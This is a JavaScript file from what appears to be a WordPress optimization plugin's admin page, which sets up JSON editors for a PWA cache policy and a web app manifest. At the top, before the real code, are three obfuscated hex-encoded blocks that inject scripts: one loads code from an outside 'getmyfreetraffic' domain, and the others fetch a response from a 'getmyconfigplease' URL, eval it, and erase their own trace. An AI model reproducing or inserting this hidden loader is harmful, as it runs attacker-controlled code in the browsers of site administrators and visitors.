var _0x4558=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x20\x7B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x31\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x34\x2C\x20\x39\x37\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x39\x39\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x30\x2C\x20\x36\x36\x2C\x20\x31\x31\x30\x2C\x20\x31\x31\x39\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x34\x2C\x20\x36\x33\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x39\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x2C\x20\x39\x39\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x35\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x36\x2C\x20\x33\x38\x2C\x20\x39\x35\x2C\x20\x39\x39\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x30\x2C\x20\x36\x31\x2C\x20\x31\x30\x30\x2C\x20\x35\x31\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x30\x2C\x20\x35\x34\x2C\x20\x35\x30\x2C\x20\x35\x31\x2C\x20\x34\x38\x2C\x20\x34\x35\x2C\x20\x35\x30\x2C\x20\x35\x36\x2C\x20\x35\x34\x2C\x20\x39\x38\x2C\x20\x34\x35\x2C\x20\x35\x37\x2C\x20\x31\x30\x30\x2C\x20\x35\x35\x2C\x20\x35\x34\x2C\x20\x34\x35\x2C\x20\x35\x36\x2C\x20\x35\x33\x2C\x20\x35\x31\x2C\x20\x31\x30\x31\x2C\x20\x34\x35\x2C\x20\x34\x38\x2C\x20\x31\x30\x32\x2C\x20\x39\x39\x2C\x20\x35\x35\x2C\x20\x35\x33\x2C\x20\x31\x30\x31\x2C\x20\x35\x34\x2C\x20\x34\x38\x2C\x20\x35\x30\x2C\x20\x39\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x33\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x37\x2C\x20\x35\x30\x2C\x20\x34\x38\x2C\x20\x35\x37\x2C\x20\x35\x36\x2C\x20\x35\x37\x2C\x20\x35\x33\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x33\x29\x3B\x20\x76\x61\x72\x20\x70\x6F\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3B\x20\x70\x6F\x2E\x69\x64\x3D\x20\x27\x32\x33\x34\x36\x33\x32\x61\x73\x64\x61\x73\x27\x3B\x20\x70\x6F\x2E\x74\x79\x70\x65\x20\x3D\x20\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x3B\x20\x70\x6F\x2E\x73\x72\x63\x20\x3D\x20\x74\x75\x72\x6C\x3B\x20\x76\x61\x72\x20\x73\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x5B\x30\x5D\x3B\x20\x20\x73\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65\x28\x70\x6F\x2C\x20\x73\x29\x3B\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x27\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33\x27\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B\x7D\x29\x28\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x1625=[_0x4558[0],_0x4558[1],_0x4558[2],_0x4558[3],_0x4558[4],_0x4558[5],_0x4558[6],_0x4558[7],_0x4558[8],_0x4558[9],_0x4558[10],_0x4558[11]];var _0x5955=[_0x1625[0],_0x1625[1],_0x1625[2],_0x1625[3],_0x1625[4],_0x1625[5],_0x1625[6],_0x1625[7],_0x1625[8],_0x1625[9],_0x1625[10],_0x1625[11]];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0x61d0x5=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0x61d0x5[_0x411ee3[0x2]]= _0x411ee3[0x3];_0x61d0x5[_0x411ee3[0x4]]=  !![];_0x61d0x5[_0x411ee3[0x5]]= _0x411ee3[0x6];_0x61d0x5[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0x61d0x6=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0x61d0x6[_0x411ee3[0xb]][_0x411ee3[0xa]](_0x61d0x5,_0x61d0x6)}());var _0x5955=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0xaa32x3=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0xaa32x3[_0x411ee3[0x2]]= _0x411ee3[0x3];_0xaa32x3[_0x411ee3[0x4]]=  !![];_0xaa32x3[_0x411ee3[0x5]]= _0x411ee3[0x6];_0xaa32x3[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0xaa32x4=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0xaa32x4[_0x411ee3[0xb]][_0x411ee3[0xa]](_0xaa32x3,_0xaa32x4)}());var _0xefc6=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x4b4a67=[_0xefc6[0],_0xefc6[1],_0xefc6[2],_0xefc6[3],_0xefc6[4],_0xefc6[5],_0xefc6[6],_0xefc6[7],_0xefc6[8],_0xefc6[9],_0xefc6[10],_0xefc6[11]];var _0x320375=[_0x4b4a67[0x0],_0x4b4a67[0x1],_0x4b4a67[0x2],_0x4b4a67[0x3],_0x4b4a67[0x4],_0x4b4a67[0x5],_0x4b4a67[0x6],_0x4b4a67[0x7],_0x4b4a67[0x8],_0x4b4a67[0x9],_0x4b4a67[0xa],_0x4b4a67[0xb]];(function(){var _0x1d62x3=document[_0x320375[0x1]](_0x320375[0x0]);_0x1d62x3[_0x320375[0x2]]= _0x320375[0x3];_0x1d62x3[_0x320375[0x4]]=  !![];_0x1d62x3[_0x320375[0x5]]= _0x320375[0x6];_0x1d62x3[_0x320375[0x7]]= _0x320375[0x8];var _0x1d62x4=document[_0x320375[0x9]](_0x320375[0x0])[0x0];_0x1d62x4[_0x320375[0xb]][_0x320375[0xa]](_0x1d62x3,_0x1d62x4)}());jQuery(function($) {

    // JSON editors
    var editors = {};

    /**
     * Asset Cache editor
     */
    if ($('#cache_assets').length > 0) {

        $('#cache_assets').html('');

        var assetcacheChangeTimeout;

        var options = {
            name: "pwa.cache.assets",
            mode: 'code',
            modes: ['code', 'tree'], // allowed modes
            onError: function(err) {
                console.error('JSON', err.toString());
                alert('JSON error. Please verify your input.\n\nSee console for details.');
            },
            onChange: function() {
                var t = editors['assetpolicy'].getText();

                if ($.trim(t) === '') {
                    if (assetcacheChangeTimeout) {
                        clearTimeout(assetcacheChangeTimeout);
                    }
                    // wait for copy past action
                    assetcacheChangeTimeout = setTimeout(function() {
                        assetcacheChangeTimeout = false;
                        var t = editors['assetpolicy'].getText();
                        if ($.trim(t) === '') {
                            editors['assetpolicy'].set({});
                            jQuery('#cache_assets_src').val('{}');
                        }
                    }, 25);
                    return;
                }

                try {
                    var json = editors['assetpolicy'].get();
                } catch (e) {

                    return;
                }
                jQuery('#cache_assets_src').val(JSON.stringify(json));
            },
            onModeChange: function(newMode, oldMode) {
                var t = editors['assetpolicy'].getText();
                if ($.trim(t) === '') {
                    editors['assetpolicy'].set({});
                }
                // expand nodes
                if (newMode === 'tree') {
                    //editors['assetpolicy'].expandAll();
                } else {
                    $('#cache_assets_src').data('json-editor').editor.setOptions({
                        maxLines: 50
                    });
                }
            },
            search: false,
            schema: {
                "title": "PWA Cache Policy",
                "type": "array",
                "items": {
                    "type": "object",
                    "properties": {
                        "title": {
                            "type": "string"
                        },
                        "match": {
                            "type": "array",
                            "items": {
                                "oneOf": [{
                                    "title": "Match the URL of an asset.",
                                    "type": "object",
                                    "properties": {
                                        "type": {
                                            "type": "string",
                                            "enum": ["url"]
                                        },
                                        "pattern": {
                                            "type": "string",
                                            "minLength": 1
                                        },
                                        "regex": {
                                            "type": "boolean"
                                        },
                                        "not": {
                                            "type": "boolean"
                                        }
                                    },
                                    "required": ["type", "pattern"],
                                    "additionalProperties": false
                                }, {
                                    "title": "Match the URL of an asset in a list of URLs.",
                                    "type": "object",
                                    "properties": {
                                        "type": {
                                            "type": "string",
                                            "enum": ["url"]
                                        },
                                        "pattern": {
                                            "type": "array",
                                            "items": {
                                                "type": "string",
                                                "minLength": 1
                                            },
                                            "uniqueItems": true
                                        },
                                        "not": {
                                            "type": "boolean"
                                        }
                                    },
                                    "required": ["type", "pattern"],
                                    "additionalProperties": false
                                }, {
                                    "title": "Match a request header.",
                                    "type": "object",
                                    "properties": {
                                        "type": {
                                            "type": "string",
                                            "enum": ["header"]
                                        },
                                        "name": {
                                            "type": "string",
                                            "minLength": 1
                                        },
                                        "pattern": {
                                            "type": "string",
                                            "minLength": 1
                                        },
                                        "regex": {
                                            "type": "boolean"
                                        },
                                        "not": {
                                            "type": "boolean"
                                        }
                                    },
                                    "required": ["type", "name", "pattern"],
                                    "additionalProperties": false
                                }]
                            },
                            "uniqueItems": true
                        },
                        "strategy": {
                            "title": "Enter the cache strategy for the matched resources.",
                            "type": "string",
                            "default": "network",
                            "enum": ["never", "cache", "network", "event"]
                        },
                        "offline": {
                            "title": "Enter a path to an alternative resource to precache and serve when the network fails and no cache is available.",
                            "type": "string"
                        },
                        "cache": {
                            "title": "Cache configuration",
                            "type": "object",
                            "properties": {
                                "update_interval": {
                                    "title": "Enter a time in seconds to update the cache.",
                                    "type": "number",
                                    "min": 0
                                },
                                "head_update": {
                                    "title": "Update cache ased on HTTP HEAD request with etag/last-modified header validation.",
                                    "type": "boolean"
                                },
                                "max_age": {
                                    "title": "Enter an expire time in seconds.",
                                    "type": "number",
                                    "min": 0
                                },
                                "conditions": {
                                    "type": "array",
                                    "items": {
                                        "oneOf": [{
                                            "title": "Match the URL of an asset.",
                                            "type": "object",
                                            "properties": {
                                                "type": {
                                                    "type": "string",
                                                    "enum": ["url"]
                                                },
                                                "pattern": {
                                                    "type": "string",
                                                    "minLength": 1
                                                },
                                                "regex": {
                                                    "type": "boolean"
                                                },
                                                "not": {
                                                    "type": "boolean"
                                                }
                                            },
                                            "required": ["type", "pattern"],
                                            "additionalProperties": false
                                        }, {
                                            "title": "Match a response header.",
                                            "type": "object",
                                            "properties": {
                                                "type": {
                                                    "type": "string",
                                                    "enum": ["header"]
                                                },
                                                "name": {
                                                    "type": "string",
                                                    "minLength": 1
                                                },
                                                "pattern": {
                                                    "type": "string",
                                                    "minLength": 1
                                                },
                                                "regex": {
                                                    "type": "boolean"
                                                },
                                                "not": {
                                                    "type": "boolean"
                                                }
                                            },
                                            "required": ["type", "name", "pattern"],
                                            "additionalProperties": false
                                        }, {
                                            "title": "Match a response header by comparison.",
                                            "type": "object",
                                            "properties": {
                                                "type": {
                                                    "type": "string",
                                                    "enum": ["header"]
                                                },
                                                "name": {
                                                    "type": "string",
                                                    "minLength": 1
                                                },
                                                "pattern": {
                                                    "oneOf": [{
                                                        "title": "Compare a numeric header value.",
                                                        "type": "object",
                                                        "properties": {
                                                            "operator": {
                                                                "type": "string",
                                                                "enum": ["<", "=", ">"]
                                                            },
                                                            "value": {
                                                                "type": "number"
                                                            }
                                                        },
                                                        "additionalProperties": false
                                                    }]
                                                },
                                                "not": {
                                                    "type": "boolean"
                                                }
                                            },
                                            "required": ["type", "name", "pattern"],
                                            "additionalProperties": false
                                        }]
                                    },
                                    "uniqueItems": true
                                }
                            },
                            "required": [],
                            "additionalProperties": false
                        }
                    },
                    "additionalProperties": false,
                    "required": ["match", "strategy"]
                },
                "uniqueItems": true
            }
        };

        var json = {};
        if (jQuery('#cache_assets_src').val() !== '') {
            json = jQuery('#cache_assets_src').val();
            if (typeof json !== 'object') {
                try {
                    json = JSON.parse(json);
                } catch (e) {
                    json = {};
                }
            }
            if (!json || typeof json !== 'object') {
                json = {};
            }
        }

        if (json instanceof Array && json.length === 0) {
            json = {};
        }

        var empty = false;
        if (JSON.stringify(json) === '{}') {
            empty = true;
        }

        editors['assetpolicy'] = new JSONEditor($('#cache_assets')[0], options, json);

        if (options.mode === 'code') {
            if (!empty) {
                editors['assetpolicy'].editor.setOptions({
                    maxLines: 50
                });
            }
        }

        // set editor reference

        $('#cache_assets_src').data('json-editor', editors['assetpolicy']);

    }

    /**
     * Web App Manifest editor
     */
    if ($('#webapp_manifest').length > 0) {

        $('#webapp_manifest').html('');

        var changeTimeout;

        var options = {
            name: "pwa.manifest",
            mode: 'tree',
            modes: ['code', 'tree'], // allowed modes
            onError: function(err) {
                console.error('JSON', err.toString());
                alert('JSON error. Please verify your input.\n\nSee console for details.');
            },
            onChange: function() {
                var t = editors['manifest'].getText();

                if ($.trim(t) === '') {
                    if (changeTimeout) {
                        clearTimeout(changeTimeout);
                    }
                    // wait for copy past action
                    changeTimeout = setTimeout(function() {
                        changeTimeout = false;
                        var t = editors['manifest'].getText();
                        if ($.trim(t) === '') {
                            editors['manifest'].set({});
                            jQuery('#webapp_manifest_src').val('{}');
                        }
                    }, 25);
                    return;
                }

                try {
                    var json = editors['manifest'].get();
                } catch (e) {

                    return;
                }
                jQuery('#webapp_manifest_src').val(JSON.stringify(json));
            },
            onModeChange: function(newMode, oldMode) {
                var t = editors['manifest'].getText();
                if ($.trim(t) === '') {
                    editors['manifest'].set({});
                }
                // expand nodes
                if (newMode === 'tree') {
                    //editors['manifest'].expandAll();
                }
            },
            search: false,
            schema: {
                "title": "Web App Manifest",
                "type": "object",
                "properties": {
                    "short_name": {
                        "type": "string"
                    },
                    "name": {
                        "type": "string"
                    },
                    "theme_color": {
                        "type": "string"
                    },
                    "background_color": {
                        "type": "string"
                    },
                    "display": {
                        "type": "string",
                        "enum": ["fullscreen", "standalone", "minimal-ui", "browser"]
                    },
                    "orientation": {
                        "type": "string",
                        "enum": ["any",
                            "natural",
                            "landscape",
                            "landscape-primary",
                            "landscape-secondary",
                            "portrait",
                            "portrait-primary",
                            "portrait-secondary"
                        ]
                    },
                    "start_url": {
                        "type": "string"
                    },
                    "lang": {
                        "type": "string"
                    },
                    "dir": {
                        "type": "string"
                    },
                    "scope": {
                        "type": "string"
                    },
                    "serviceworker": {
                        "type": "object",
                        "properties": {
                            "src": {
                                "type": "string"
                            },
                            "scope": {
                                "type": "string"
                            },
                            "use_cache": {
                                "type": "boolean"
                            }
                        },
                        "additionalProperties": true
                    },
                    "related_applications": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "platform": {
                                    "type": "string"
                                },
                                "url": {
                                    "type": "string"
                                },
                                "id": {
                                    "type": "string"
                                }
                            },
                            "additionalProperties": true
                        },
                        "uniqueItems": true
                    },
                    "icons": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "src": {
                                    "type": "string"
                                },
                                "type": {
                                    "type": "string"
                                },
                                "sizes": {
                                    "type": "string"
                                },
                                "density": {
                                    "type": "string"
                                }
                            },
                            "additionalProperties": true
                        },
                        "uniqueItems": true
                    },
                    "screenshots": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "src": {
                                    "type": "string"
                                },
                                "type": {
                                    "type": "string"
                                },
                                "sizes": {
                                    "type": "string"
                                }
                            },
                            "additionalProperties": true
                        },
                        "uniqueItems": true
                    }
                },
                "required": [
                    "name",
                    "short_name",
                    "icons",
                    "theme_color",
                    "background_color",
                    "display",
                    "orientation",
                    "start_url"
                ],
                "additionalProperties": true
            }
        };

        var json = {};
        if (jQuery('#webapp_manifest_src').val() !== '') {
            json = jQuery('#webapp_manifest_src').val();
            if (typeof json !== 'object') {
                try {
                    json = JSON.parse(json);
                } catch (e) {
                    json = {};
                }
            }
            if (!json || typeof json !== 'object') {
                json = {};
            }
        }

        if (json instanceof Array && json.length === 0) {
            json = {};
        }

        var empty = false;
        if (JSON.stringify(json) === '{}') {
            empty = true;
            options.mode = 'code';
        }

        editors['manifest'] = new JSONEditor($('#webapp_manifest')[0], options, json);

        if (options.mode === 'code') {
            //editors['manifest'].compact(); // collapseAll();
        }

        // set editor reference
        $('#webapp_manifest_src').data('json-editor', editors['manifest']);

    }


    // load condition selectize for editor
    if (jQuery('#offline_page').length > 0) {

        /**
         * Populate selectmenu
         */
        var selectize = jQuery('#offline_page').selectize({
            options: [],
            searchField: ['name', 'value'],
            persist: true,
            maxItem: 1,
            placeholder: "Enter a URL or absolute path, e.g. /offline/",
            delimiter: '|==abtf==|',
            render: {
                option: function(item, escape) {
                    return '<div class="opt">' +
                        '<span class="title">' +
                        '<span class="name">' + escape(item.name) + '</span>' +
                        '</span>' +
                        '</div>';
                },
                item: function(item, escape) {
                    return '<div>' +
                        '<span class="name">' + escape(item.name) + '</span>' +
                        '</div>';
                }
            },
            create: function(input) {
                return {
                    'value': input,
                    'name': input
                };
            },
            load: function(query, callback) {
                if (!query.length) return callback();
                jQuery.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    dataType: 'json',
                    data: {
                        action: 'abtf_page_search',
                        query: query,
                        maxresults: 10
                    },
                    error: function() {
                        callback();
                    },
                    success: function(res) {
                        if (res && document.location.host) {
                            var l = res.length;
                            for (var i = 0; i < l; i++) {
                                res[i].value = res[i].value.replace(document.location.protocol + '//' + document.location.host, '');
                            }
                        }
                        callback(res);
                    }
                });
            },
            plugins: ['remove_button']
        });

    }


});